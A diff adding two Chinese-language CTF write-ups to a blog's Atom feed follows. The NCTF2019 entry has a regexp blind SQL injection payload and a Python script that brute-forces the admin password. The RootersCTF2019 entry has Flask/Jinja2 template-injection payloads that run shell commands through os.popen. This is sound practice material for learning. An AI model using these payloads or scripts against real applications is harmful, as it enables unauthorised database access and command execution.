@@ -5,6 +5,7 @@
     <link href="http://odiws.github.io" />
     <updated>2024-09-23T07:32:41.000Z</updated>
     <category term="buuctf" />
+    <category term="regexp注入" />
     <category term="thinkphpV6.0.0" />
     <category term="zip加密" />
     <entry>
@@ -73,5 +74,111 @@ echo urlencode(serialize($c));
         <category term="buuctf" />
         <category term="thinkphpV6.0.0" />
         <updated>2024-09-23T07:32:41.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://odiws.github.io/2024/06/06/[NCTF2019]SQLi/</id>
+        <title>&#39;[NCTF2019]SQLi&#39;</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/06/06/[NCTF2019]SQLi/"/>
+        <content type="html">&lt;h2 id=&#34;nctf2019sqli&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#nctf2019sqli&#34;&gt;#&lt;/a&gt; [NCTF2019]SQLi&lt;/h2&gt;
+&lt;p&gt;源码泄露：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BNCTF2019%5DSQLi/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;找到 hint.php&lt;/p&gt;
+&lt;p&gt;目的明确：&lt;/p&gt;
+&lt;p&gt;只要密码是 admin 的密码就可以获得 flag&lt;/p&gt;
+&lt;p&gt;得到提示，这题过滤了好多关键字，只要 password 的密码等于 admin 的密码就能拿到 flag 了，但是怎么拿呢？看了 dalao 的 wp 才发现有 regexp 注入&lt;/p&gt;
+&lt;h3 id=&#34;regexp注入正则注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#regexp注入正则注入&#34;&gt;#&lt;/a&gt; regexp 注入（正则注入）&lt;/h3&gt;
+&lt;p&gt;这个注入方式呢相当于&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTUlQjglODMlRTUlQjAlOTQlRTclOUIlQjIlRTYlQjMlQTgmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw&#34;&gt;布尔盲注&lt;/span&gt;吧，若是猜对了就返回正确的页面，我们本地测试一下正则，先看一下全部数据，然后 ^ 匹配 e 开头的 password&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BNCTF2019%5DSQLi/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;再找个 a 开头的：没有&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BNCTF2019%5DSQLi/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
+&lt;p&gt;分析&lt;br&gt;
+回到题目里，提示给了串 SQL 语句&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;select * from users where username=&#39;&#39; and passwd=&#39;&#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;想要猜解 admin 的密码需要用到 admin，可是题目过滤掉了 admin，但是我们能用其他方法绕过，让 username=\，将语句后面的单引号给转义掉，我们可以构造这样的 payload&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;username=\&amp;amp;passwd=||sql;%00
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;因为题目过滤掉了空格，空格能用内联注释符 /**/ 代替&lt;/p&gt;
+&lt;p&gt;注释符 #和 --  被过滤掉了，这里用；%00 截断注释后面的内容&lt;/p&gt;
+&lt;p&gt;放入原查询语句相当于&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;select * from users where username=&#39;\&#39; and passwd=&#39;||sql;%00&#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;即&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;select * from users where sql;%00
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这时候就能利用正则进行注入了构建 payload&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;username=\&amp;amp;passwd=||/**/passwd/**/regexp/**/&amp;quot;^x&amp;quot;;%00
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;相当于&lt;/p&gt;
+&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; users &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/**/&lt;/span&gt;passwd&lt;span class=&#34;token comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;regexp&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;^x&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;先用 burpsuite 跑一下（注意该一下爆破频率，不然 429），看看正确与错误的情况，好写脚本跑&lt;br&gt;
+&lt;img data-src=&#34;../images/%5BNCTF2019%5DSQLi/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BNCTF2019%5DSQLi/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
+&lt;p&gt;跑完后发现错误的话会有个 js 的弹窗出来，跑对了就没有 ，这里可以看到密码第一位是 y（或 Y，不区分大小写），以此写个 python 脚本&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#buuctf web [NCTF2019]SQLi
+import requests
+import string
+ 
+ 
+url = &amp;quot;http://2e2494c3-b85d-49f4-81b8-63ee389a9c30.node4.buuoj.cn:81/&amp;quot;
+pw_fuzz = string.ascii_lowercase + string.digits + &amp;quot;_&amp;quot;      #密码字典：小写字母和数字还有下划线
+pw = &amp;quot;&amp;quot;     #admin的密码
+ 
+ 
+while True:
+    for i in pw_fuzz:
+        data=&amp;#123;
+            &#39;username&#39;:&#39;\\&#39;,
+            &#39;passwd&#39;:&#39;||/**/passwd/**/regexp/**/&amp;quot;^&amp;#123;&amp;#125;&amp;quot;;\x00&#39;.format((pw+i))
+        &amp;#125;
+        res = requests.post(url=url,data=data).text
+        if &amp;quot;alert&amp;quot; not in res:
+            pw = pw + i
+            print(pw)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BNCTF2019%5DSQLi/6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
+&lt;p&gt;交到密码获得 flag：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BNCTF2019%5DSQLi/7.png&#34; alt=&#34;7&#34;&gt;&lt;/p&gt;
+</content>
+        <category term="buuctf" />
+        <category term="regexp注入" />
+        <updated>2024-06-06T13:19:01.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://odiws.github.io/2024/06/06/[RootersCTF2019]I_3_Flask/</id>
+        <title>&#39;[RootersCTF2019]I_&lt;3_Flask&#39;</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/06/06/[RootersCTF2019]I_3_Flask/"/>
+        <content type="html">&lt;h2 id=&#34;rootersctf2019i_️_flask&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rootersctf2019i_️_flask&#34;&gt;#&lt;/a&gt; [RootersCTF2019]I_❤️_Flask&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BRootersCTF2019%5DI_3_Flask/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;arjun 工具用于&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BRootersCTF2019%5DI_3_Flask/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这题没有过滤，直接用常规的注入语句即可&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;?name=&amp;#123;% for c in [].__class__.__base__.__subclasses__() %&amp;#125;&amp;#123;% if c.__name__==&#39;catch_warnings&#39; %&amp;#125;&amp;#123;&amp;#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&#34;__import__(&#39;os&#39;).popen(&#39;cat flag.txt&#39;).read()&#34;) &amp;#125;&amp;#125;&amp;#123;% endif %&amp;#125;&amp;#123;% endfor %&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;拿到 flag&lt;br&gt;
+&lt;img data-src=&#34;../images/%5BRootersCTF2019%5DI_3_Flask/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
+&lt;p&gt;在该文件同地址的模板是这样的：&lt;/p&gt;
+&lt;p&gt;但是如果是根目录就是：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;% for c in [].__class__.__base__.__subclasses__() %&amp;#125;
+&amp;#123;% if c.__name__ == &#39;catch_warnings&#39; %&amp;#125;
+  &amp;#123;% for b in c.__init__.__globals__.values() %&amp;#125;
+  &amp;#123;% if b.__class__ == &amp;#123;&amp;#125;.__class__ %&amp;#125;
+    &amp;#123;% if &#39;eva&#39;+&#39;l&#39; in b.keys() %&amp;#125;
+      &amp;#123;&amp;#123; b[&#39;eva&#39;+&#39;l&#39;](&#39;__impor&#39;+&#39;t__&#39;+&#39;(&#34;o&#39;+&#39;s&#34;)&#39;+&#39;.pope&#39;+&#39;n&#39;+&#39;(&#34;ls /&#34;).read()&#39;) &amp;#125;&amp;#125;
+    &amp;#123;% endif %&amp;#125;
+  &amp;#123;% endif %&amp;#125;
+  &amp;#123;% endfor %&amp;#125;
+&amp;#123;% endif %&amp;#125;
+&amp;#123;% endfor %&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;还可以：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;% for c in [].__class__.__base__.__subclasses__() %&amp;#125;&amp;#123;% if c.__name__==&#39;catch_warnings&#39; %&amp;#125;&amp;#123;&amp;#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;/&#39;)&amp;#125;&amp;#125;&amp;#123;% endif %&amp;#125;&amp;#123;% endfor %&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;还可以用 fenjing 直接秒了：&lt;/p&gt;
+&lt;p&gt;使用方法博客上有：&lt;/p&gt;
+&lt;p&gt;直接秒了&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BRootersCTF2019%5DI_3_Flask/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
+</content>
+        <category term="buuctf" />
+        <updated>2024-06-06T11:43:07.000Z</updated>
     </entry>
 </feed>
